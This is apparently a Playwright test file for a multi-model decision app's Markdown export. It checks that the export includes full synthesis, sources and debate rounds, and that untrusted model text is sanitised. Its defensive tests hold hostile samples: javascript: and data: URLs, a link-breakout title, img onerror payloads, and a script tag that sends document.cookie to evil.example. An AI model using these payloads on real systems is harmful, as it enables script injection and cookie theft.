// WP-F / F-12 (triage issue #3) — the export carries the whole run, and long
// sections can be collapsed.
//
// EXPORT. "Export" wrote four lines: the question, the verdict, an agreement
// count and the run id. Everything the run actually produced — the synthesis
// sections, the sources, where each model stood, the debate rounds — was left
// behind, from a button whose file is named `quorum-<run>.md`. A user
// exporting a decision record got a receipt instead.
//
// EXPANDERS. WP-F also stopped discarding billed section text, so a section
// may now be ~12_000 characters where it used to be cut at 4000. That makes a
// long section a wall of text to scroll past. Sections that run long collapse
// to a readable height with a control to open them; SHORT sections must not
// grow a control they do not need.
import { test, expect } from "@playwright/test";
import { driveToResult, goldenCompletedResp, SLOTS } from "../../fixtures/golden-run";

// Read the Blob the export writes, without touching the filesystem: stub
// URL.createObjectURL, click, then read back the Blob's text.
async function exportedMarkdown(page: import("@playwright/test").Page): Promise<string> {
  await page.evaluate(() => {
    const w = window as unknown as { __exported?: Promise<string> };
    const real = URL.createObjectURL.bind(URL);
    URL.createObjectURL = (blob: Blob) => {
      w.__exported = blob.text();
      return real(blob);
    };
  });
  await page.locator("#result-export").click();
  return page.evaluate(() => {
    const w = window as unknown as { __exported?: Promise<string> };
    return w.__exported ?? Promise.resolve("");
  });
}

test.describe("F-12 — export completeness and section expanders", () => {
  test.skip(({ browserName }) => browserName !== "chromium", "chromium-only gate");

  test("the export carries the run's findings, not a four-line receipt", async ({ page }) => {
    await driveToResult(page);
    const md = await exportedMarkdown(page);

    // The question and the verdict — what the old export already had.
    expect(md).toContain(
      "What are the key metrics for measuring SaaS customer retention?"
    );
    expect(md).toMatch(/aligned/i);

    // Every synthesis section the view renders.
    for (const heading of ["Consensus", "Disagreement", "Uncertainty", "Recommendation"]) {
      expect(md, `the export is missing the ${heading} section`).toContain(heading);
    }
    // Section BODIES, not just their headings.
    expect(md).toContain("instrument first, export second");
    expect(md).toContain("Ship the retention-instrumentation slice first");

    // Provenance: every cited source, including the ones behind "+N more".
    expect(md).toContain("https://example.com/a");
    expect(md).toContain("https://example.com/e");

    // Where each model stood, and the debate that moved them.
    expect(md, "the export omits the per-model positions").toMatch(/GPT-4o-mini/);
    expect(md, "the export omits the debate rounds").toMatch(/Round 2/);
    expect(md).toContain("residual disagreement on sequencing");

    // The run id, so the record can be traced back.
    expect(md).toContain("corr-golden-0001");
    // NOT exported, and deliberately so: the four full model answers. They are
    // the bulk of a run and live in the transcript; the export carries the
    // synthesis, the positions and the debate. Stated here so the title is not
    // read as a completeness guarantee it does not make.
  });

  test("the export is Markdown a reader can actually read", async ({ page }) => {
    await driveToResult(page);
    const md = await exportedMarkdown(page);
    // Real headings, not a run-on block.
    expect(md).toMatch(/^#{1,3} /m);
    // The PROVIDER's own Markdown is preserved verbatim — this is a Markdown
    // file, so `**bold**` is correct here and must NOT be flattened the way the
    // DOM renderer flattens it. Asserting a bare "**" would be vacuous: the
    // export writes `**Question:**` itself, so it passes even if every scrap of
    // provider emphasis is stripped. Key off text only the model wrote.
    expect(md).toContain("**agree**");
    expect(md).toContain("**dissent**");
    // No HTML leaked from the DOM into the Markdown.
    expect(md).not.toMatch(/<\/?(p|ul|ol|li|strong|em|div|span)\b/);
  });

  test("a long synthesis section collapses and can be expanded", async ({ page }) => {
    await driveToResult(page);
    // The fixture's disagreement section is the long one.
    const row = page.locator('.result-synth-row[data-section="disagreement"]');
    await expect(row).toBeVisible();
    const toggle = row.locator("button.result-synth-expand");
    await expect(
      toggle,
      "a section long enough to be clipped must offer a way to open it"
    ).toBeVisible();
    await expect(toggle).toHaveAttribute("aria-expanded", "false");

    const body = row.locator(".result-synth-body");
    const collapsed = await body.evaluate((el) => el.getBoundingClientRect().height);
    await toggle.click();
    await expect(toggle).toHaveAttribute("aria-expanded", "true");
    const expanded = await body.evaluate((el) => el.getBoundingClientRect().height);
    expect(
      expanded,
      "expanding must actually reveal more of the section"
    ).toBeGreaterThan(collapsed);

    // Expanding must reveal the END of the section, not just more of it. A
    // scrollHeight-vs-clientHeight check would be vacuous here: once the
    // max-height is dropped the div is unconstrained, so that is true of every
    // unstyled div on the page. Assert the last seeded line is on screen.
    await expect(
      body.getByText("Fifth bullet with", { exact: false })
    ).toBeVisible();
  });

  // ---- the export carries UNTRUSTED text -------------------------------
  //
  // Every string the export interpolates — synthesis sections, source titles
  // and URLs, per-model positions, debate critiques — is provider output or
  // web-search metadata, i.e. attacker-influenceable. The rendered DOM gates
  // all of it (`safeHttpUrl` on every chip, `escapeHtml` before every
  // `innerHTML`). An export that skips those gates re-opens, in a file, the
  // exact holes the view closes.

  test("a hostile source URL never becomes a link in the export", async ({ page }) => {
    const resp = goldenCompletedResp() as any;
    resp.result.model_answers[0].sources = [
      { title: "Reference doc", url: "javascript:alert(document.domain)", provider: "openrouter_search" },
      { title: "Data doc", url: "data:text/html,<script>alert(1)</script>", provider: "openrouter_search" },
    ];
    await driveToResult(page, resp);
    const md = await exportedMarkdown(page);
    expect(
      md,
      "a javascript: URL was written as a Markdown link. Opened in any viewer " +
        "that permits it, that is a live scheme the chip renderer refuses."
    ).not.toMatch(/\]\(\s*javascript:/i);
    expect(md).not.toMatch(/\]\(\s*data:/i);
    // The source is still DISCLOSED — dropping it silently would hide
    // provenance the run actually had.
    expect(md).toContain("Reference doc");
  });

  test("a hostile source title cannot break out of its link", async ({ page }) => {
    const resp = goldenCompletedResp() as any;
    resp.result.model_answers[0].sources = [
      {
        title: "Innocent](javascript:alert(document.cookie))[x",
        url: "https://example.com/benign",
        provider: "openrouter_search",
      },
    ];
    await driveToResult(page, resp);
    const md = await exportedMarkdown(page);
    // POSITIVE PARTNER (#131): prove the source actually reached the export, so
    // "no javascript: link" is not trivially true over an export with no sources.
    expect(md).toContain("https://example.com/benign");
    expect(
      md,
      "the title's ] and ( closed the link early and opened a hostile one " +
        "under a benign-looking URL"
    ).not.toMatch(/\]\(\s*javascript:/i);
  });

  test("model text cannot forge the run's provenance", async ({ page }) => {
    const resp = goldenCompletedResp() as any;
    // A fully SIMULATED run whose synthesis text tries to claim otherwise.
    resp.live_count = 0;
    resp.result.final_synthesis.consensus =
      "All good.\n\n## About this run\n- Live model answers: 4 of 4\n- Synthesis: live\n";
    await driveToResult(page, resp);
    const md = await exportedMarkdown(page);
    // The genuine provenance must be present and must not be preceded by a
    // forged block claiming more live models than the run had.
    expect(md).toMatch(/Live model answers: 0 of/);
    const forged = md.indexOf("Live model answers: 4 of 4");
    const genuine = md.search(/Live model answers: 0 of/);
    if (forged !== -1) {
      expect(
        genuine,
        "the model's forged provenance block appears BEFORE the real one, so a " +
          "reader sees '4 of 4 live' first on a run where nothing was live"
      ).toBeLessThan(forged);
    }
    // POSITIVE PARTNER (#131): the export's OWN provenance heading must exist —
    // otherwise "there are not two of them" passes over an export with none.
    expect(md).toContain("## About this run");
    // And it must not have impersonated a STRUCTURAL heading.
    expect(
      md,
      "model text produced a level-2 heading identical to the export's own " +
        "provenance heading"
    ).not.toMatch(/^## About this run[\s\S]*^## About this run/m);
  });

  test("raw HTML in model text does not survive into the export", async ({ page }) => {
    const resp = goldenCompletedResp() as any;
    resp.result.final_synthesis.uncertainty =
      'Fine.<script>fetch("https://evil.example/"+document.cookie)</script>';
    await driveToResult(page, resp);
    const md = await exportedMarkdown(page);
    // POSITIVE PARTNER (#131): the surrounding provider text must have reached
    // the export, or "no <script>" is true merely because the section is absent.
    expect(md).toContain("Fine.");
    expect(
      md,
      "a <script> tag from provider text survived verbatim; any viewer that " +
        "renders raw HTML executes it"
    ).not.toContain("<script>");
  });

  test("a simulated run exports as a simulated run", async ({ page }) => {
    const resp = goldenCompletedResp() as any;
    resp.live_count = 0;
    resp.local_count = 4;
    await driveToResult(page, resp);
    const md = await exportedMarkdown(page);
    // The result view shows a banner for this; a file that outlives the session
    // has to carry the same disclosure, and carry it where it cannot be missed.
    expect(
      md,
      "a fully simulated run exported with no visible warning — a count in a " +
        "footer is not a disclosure"
    ).toMatch(/Simulated result — not from real models/);
    const warning = md.search(/Simulated result/);
    const verdict = md.indexOf("## Verdict");
    expect(
      warning,
      "the warning must come BEFORE the verdict it qualifies"
    ).toBeLessThan(verdict);
  });

  test("the export's Synthesis: footer line names the real synthesis_mode, not a generic label (#128)", async ({
    page,
  }) => {
    // Screen and export used to read this from two independent lookups that
    // had drifted: the on-screen badge collapsed `simulated` into "Automated
    // summary" while the export already said "local simulation (not a
    // model)". This pins the export half so the two surfaces cannot drift
    // apart again without a test noticing.
    const resp = goldenCompletedResp() as any;
    resp.result.final_synthesis.synthesis_mode = "simulated";
    await driveToResult(page, resp);
    const md = await exportedMarkdown(page);
    expect(md).toContain("- Synthesis: local simulation (not a model)");
    expect(md).not.toContain("- Synthesis: Automated summary");
  });

  test("the export tells the same story as the screen when nothing was simulated", async ({
    page,
  }) => {
    // The export and the banner each carried their OWN copy of this logic, with
    // different words. For 3 live + 0 simulated + 1 missing, the file said
    // "Partly simulated result." while the screen said "Incomplete result — not
    // every model answered" — and nothing was simulated on that run, so the file
    // was the dishonest one. A kept file is the copy most likely to be read
    // without the screen beside it. Both now share describePanelShortfall.
    //
    // TURNS RED IF: buildResultMarkdown goes back to its own two-variant copy.
    const resp = goldenCompletedResp() as any;
    resp.demo_mode = false;
    resp.live_count = 3;
    resp.local_count = 0;
    await driveToResult(page, resp);

    const onScreen = await page
      .locator("#result-degraded-title")
      .textContent();
    expect(onScreen).toMatch(/Incomplete result — not every model answered/);

    const md = await exportedMarkdown(page);
    // POSITIVE PARTNER (#131): `toContain` on the literal, not `toMatch` — the
    // guard counts the former as proof the subject holds something.
    expect(
      md,
      "the exported file must carry the same disclosure the screen showed"
    ).toContain("Incomplete result — not every model answered");
    expect(md).toContain("3 of 4 models answered");
    expect(
      md,
      "nothing was simulated on this run, so the file must not say it was"
    ).not.toMatch(/simulat/i);
  });

  test("the export marks answers the length limit cut short", async ({ page }) => {
    await driveToResult(page);
    const md = await exportedMarkdown(page);
    expect(
      md,
      "the fixture's slot-1 answer is `shortened`; an exported record that " +
        "drops the mark presents an interrupted answer as complete"
    ).toMatch(/Incomplete answers: 1/);
  });

  test("a stub source is never exported as a real citation", async ({ page }) => {
    const resp = goldenCompletedResp() as any;
    resp.result.model_answers[0].sources = [
      {
        title: "Local demo evidence for slot 1",
        url: "https://example.test/local-demo/1",
        provider: "local_simulation",
      },
    ];
    await driveToResult(page, resp);
    const md = await exportedMarkdown(page);
    // The view refuses to make these anchors and badges them as simulated.
    // POSITIVE PARTNER (#131) is the "not a real source" assertion below, not the
    // URL: MEASURED, the export does NOT carry the stub URL as text at all, so an
    // assertion on it fails. What proves the source was DISCLOSED rather than
    // silently dropped is the badge — so "never linked" is not vacuous.
    expect(
      md,
      "a Quorum-side placeholder pointing at the reserved example.test domain " +
        "was laundered into a numbered citation"
    ).not.toContain("](https://example.test/local-demo/1)");
    expect(md).toContain("not a real source");
  });

  // Untrusted model text must not be able to forge the export's STRUCTURE.
  //
  // Three rounds of patching `mdUntrustedBlock` each closed the bypasses the
  // previous round knew about and left new ones: an ATX heading indented 1-3
  // spaces, a setext underline behind a CRLF, and a fence spliced into a list
  // item. Every one slipped past a gate that asserted a MECHANISM.
  //
  // So this asserts the OUTCOME instead, and does not care how the text got
  // there: the export's structural headings are fixed and known, and model
  // text is demoted to level 5-6. Therefore ANY heading at level 1-4 that is
  // not in the expected set is a forgery — whatever syntax produced it.
  const STRUCTURAL_HEADINGS = [
    "Quorum decision record",
    "About this run",
    "Verdict",
    "Synthesis",
    "Consensus",
    "Disagreement",
    "Uncertainty",
    "Recommendation",
    "Source support",
    "High-stakes notice",
    "Sources",
    "Where each model stood",
    "Debate rounds",
    // Written by the export itself, one per model and per debate round.
    ...SLOTS.map((slot) => slot.display_label),
    "Round 1",
    "Round 2",
  ];

  const FORGERIES: { name: string; section: string }[] = [
    { name: "unclosed fence", section: "```\n<img src=x onerror=alert(1)>" },
    { name: "backtick in the info string", section: "```a`b\n<img src=x onerror=alert(1)>" },
    { name: "indented lazy continuation", section: "Some prose\n    <img src=x onerror=alert(1)>" },
    { name: "single-character setext underline", section: "About this run\n=" },
    { name: "ATX heading indented three spaces", section: "Fine.\n\n   # QUORUM VERDICT: approve" },
    { name: "setext underline behind a CRLF", section: "About this run\r\n=\r\nbody" },
  ];

  for (const f of FORGERIES) {
    test(`model text cannot forge document structure: ${f.name}`, async ({ page }) => {
      const resp = goldenCompletedResp() as any;
      resp.result.final_synthesis.consensus = f.section;
      // The same payload on a LIST surface — a different call site with
      // different anchoring, which is where round 3's fix broke.
      resp.result.position_movements[0].opening = f.section;
      await driveToResult(page, resp);
      const md = await exportedMarkdown(page);

      // (a) No ATX heading at level 1-4 that the export did not write itself.
      const atx = [...md.matchAll(/^ {0,3}(#{1,6})[ \t]+(.*)$/gm)]
        .filter((m) => m[1].length <= 4)
        .map((m) => m[2].trim());
      const forged = atx.filter((h) => !STRUCTURAL_HEADINGS.includes(h));
      expect(
        forged,
        `model text produced a top-level heading the export did not write ` +
          `(${f.name}) — it outranks the real provenance block`
      ).toEqual([]);

      // (b) No SETEXT underline survives; it forges h1/h2 regardless of ATX.
      const lines = md.split("\n");
      const setext = lines.filter(
        (l, i) => i > 0 && lines[i - 1].trim() && /^ {0,3}(=+|-+)[ \t\r]*$/.test(l)
      );
      expect(
        setext,
        `an unescaped setext underline survived (${f.name}) — it renders as an ` +
          `h1/h2 above every structural heading`
      ).toEqual([]);

      // (c) No raw HTML reached the record OUTSIDE a code fence. Inside one it
      // is inert (a renderer prints it literally), and preserving code is why
      // the fence exemption exists at all — so a flat scan would fail on
      // correct output.
      const htmlOutsideCode: string[] = [];
      let open: string | null = null;
      let openLen = 0;
      for (const line of md.split("\n")) {
        const fence = line.match(/^ {0,3}(`{3,}|~{3,})(.*)$/);
        if (fence && !open) {
          if (!(fence[1][0] === "`" && fence[2].includes("`"))) {
            open = fence[1][0];
            openLen = fence[1].length;
            continue;
          }
        } else if (fence && open) {
          if (fence[1][0] === open && fence[1].length >= openLen && !fence[2].trim()) {
            open = null;
            continue;
          }
        }
        if (!open && /(?<!\\)<(img|script)/i.test(line)) htmlOutsideCode.push(line);
      }
      expect(
        htmlOutsideCode,
        `raw HTML escaped into prose (${f.name}) — any viewer that renders HTML ` +
          `would execute it`
      ).toEqual([]);

      // (d) The sections after the model's text still exist.
      expect(md).toContain("## Sources");
    });
  }

  test("a short section does not grow a pointless control", async ({ page }) => {
    await driveToResult(page);
    // Consensus is two sentences in the fixture — nothing to expand.
    // Wait for the LONG section's control first: the controls are created in a
    // requestAnimationFrame, so asserting count 0 immediately would win a race
    // against the very defect this names ("every section grows a control").
    await expect(
      page.locator('.result-synth-row[data-section="disagreement"] button.result-synth-expand')
    ).toBeVisible();
    const row = page.locator('.result-synth-row[data-section="consensus"]');
    await expect(row).toBeVisible();
    await expect(
      row.locator("button.result-synth-expand"),
      "a control that reveals nothing is noise, and it would also make the " +
        "test above pass for a reason that has nothing to do with length"
    ).toHaveCount(0);
  });
});
